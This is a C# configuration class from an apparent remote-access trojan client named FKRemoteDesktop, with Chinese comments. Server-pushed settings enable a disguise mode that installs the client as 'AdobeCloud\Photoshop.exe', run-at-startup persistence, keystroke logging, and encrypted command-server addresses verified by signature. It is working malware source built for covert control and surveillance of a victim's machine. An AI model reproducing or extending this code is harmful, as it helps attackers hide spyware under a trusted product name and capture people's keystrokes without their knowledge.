using FKRemoteDesktop.Cryptography;
using FKRemoteDesktop.Debugger;
using FKRemoteDesktop.Helpers;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Configs
{
    // 这些都是服务器发来的配置，若增删或修改顺序，需对应服务器的 ClientBuilder.cs 中 WriteSettings 函数进行对应修改
    public static class SettingsFromServer
    {
        public static bool INSTALL = false;                         // 是否进行客户端备份（服务器）
        public static bool ISHIDEMODE = false;                      // 是否开启客户端伪装模式（服务器）
        public static bool STARTUP = false;                         // 是否开机自启动（服务器）
        public static bool ENABLELOGGER = false;                    // 是否记录客户端按键操作（服务器）

        // TODO: RECONNECTDELAY 似乎服务器写入失败了，需要检查
        public static int RECONNECTDELAY = 5;                       // 客户端断开后自动重连时间（服务器）

        public static string HOSTS = "localhost:49663;";            // 客户端需要主动连接的服务器地址（服务器）
        public static string TAG = "ClientGroup_Debug";             // 客户端标签分组（服务器）
        public static string MUTEX = "27627f1c-1d40-475c-9dd6-d9bfb358f5f0";    // 客户端唯一性的线程锁（服务器）
        public static string ENCRYPTIONKEY = "";                    // 服务器发送的AES加密密钥（服务器）
        public static string SERVERSIGNATURE = "";                  // 服务器签名，用来验证（服务器）
        public static string SERVERCERTIFICATESTR = "";             // 客户端签名，用来验证（服务器）

        public static X509Certificate2 SERVERCERTIFICATE;

        public static bool Initialize()
        {
            if (string.IsNullOrEmpty(SettingsFromClient.VERSION))
                return false;
            // 从服务器发来的STRING信息，需要解密处理
            if (!String.IsNullOrEmpty(ENCRYPTIONKEY))
            {
                var aes = new Aes256(ENCRYPTIONKEY);
                HOSTS = aes.Decrypt(HOSTS);
                TAG = aes.Decrypt(TAG);
                MUTEX = aes.Decrypt(MUTEX);
                SERVERSIGNATURE = aes.Decrypt(SERVERSIGNATURE);
                SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(aes.Decrypt(SERVERCERTIFICATESTR)));
            }
            else
            {
                Logger.Log(Enums.ELogType.eLogType_Warning, "当前为DEBUG模式，未使用服务器配置");
            }
            if (ISHIDEMODE)
            {
                RandomExeFileAndDir();
            }
            SetupPaths();
            bool bIsVerify = VerifyHash();
            if (!bIsVerify) 
            {
                Logger.Log(Enums.ELogType.eLogType_Error, "服务器签名检查未通过");
            }
            return bIsVerify;
        }

        private static void SetupPaths()
        {
            SettingsFromClient.LOGSPATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), SettingsFromClient.LOGDIRECTORYNAME);
            SettingsFromClient.INSTALLPATH = Path.Combine(SettingsFromClient.DIRECTORY, (!string.IsNullOrEmpty(SettingsFromClient.SUBDIRECTORY) ? SettingsFromClient.SUBDIRECTORY + @"\" : "") + SettingsFromClient.INSTALLNAME);
        }

        private static void RandomExeFileAndDir()
        {
            SettingsFromClient.SUBDIRECTORY = "AdobeCloud";
            SettingsFromClient.INSTALLNAME = "Photoshop.exe";
        }

        private static bool VerifyHash()
        {
#if DEBUG
            Logger.Log(Enums.ELogType.eLogType_Warning, "当前为DEBUG模式，未使用服务器签名验证");
            return true;
#else
            try
            {
                Logger.Log(Enums.ELogType.eLogType_Debug, "开始验证HASH");
                var csp = (RSACryptoServiceProvider)SERVERCERTIFICATE.PublicKey.Key;
                return csp.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(ENCRYPTIONKEY)), CryptoConfig.MapNameToOID("SHA256"),
                    Convert.FromBase64String(SERVERSIGNATURE));
            }
            catch (Exception)
            {
                return false;
            }
#endif
        }

        public new static string ToString()
        {
            StringBuilder sb = new StringBuilder();

            sb.AppendLine("ClientSetting:");
            sb.AppendLine($"  当前客户端版本: {SettingsFromClient.VERSION ?? "null"}");

            sb.AppendLine($"  是否开启客户端备份: {(INSTALL ? "是" : "否")}");
            sb.AppendLine($"  是否开启客户端伪装模式: {(ISHIDEMODE ? "是" : "否")}");
            sb.AppendLine($"  客户端备份文件夹名: {SettingsFromClient.SUBDIRECTORY ?? "null"}");
            sb.AppendLine($"  客户端备份文件名: {SettingsFromClient.INSTALLNAME ?? "null"}");

            sb.AppendLine($"  是否开机自启动: {(STARTUP ? "是" : "否")}");
            sb.AppendLine($"  开机自启动注册表项: {SettingsFromClient.STARTUPKEY ?? "null"}");

            sb.AppendLine($"  是否开启用户按键记录: {(ENABLELOGGER ? "是" : "否")}");
            sb.AppendLine($"  用户按键记录文件夹名: {SettingsFromClient.LOGDIRECTORYNAME ?? "null"}");

            sb.AppendLine($"  服务器地址: {HOSTS ?? "null"}");
            sb.AppendLine($"  重连服务器间隔时间: {RECONNECTDELAY}");
            sb.AppendLine($"  本客户端标签分组: {TAG ?? "null"}");
            sb.AppendLine($"  本客户端互斥锁: {MUTEX ?? "null"}");

            sb.AppendLine($"  本客户端AES加密Key: {StringHelper.ToShortString(ENCRYPTIONKEY) ?? "null"}");
            sb.AppendLine($"  服务器签名证书: {StringHelper.ToShortString(SERVERSIGNATURE) ?? "null"}");
            sb.AppendLine($"  本客户端签名证书: {StringHelper.ToShortString(SERVERCERTIFICATESTR) ?? "null"}");

            return sb.ToString();
        }
    }
}